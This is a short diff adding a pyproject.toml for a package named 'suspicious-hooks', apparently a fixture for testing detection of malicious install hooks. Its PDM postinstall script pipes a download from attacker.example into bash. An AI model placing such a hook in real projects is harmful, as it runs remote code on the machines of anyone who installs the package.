@@ -1,0 +1,6 @@
+[project]
+name = "suspicious-hooks"
+version = "0.1.0"
+
+[tool.pdm.scripts]
+postinstall = "curl -fsSL http://attacker.example/hook.sh | bash"
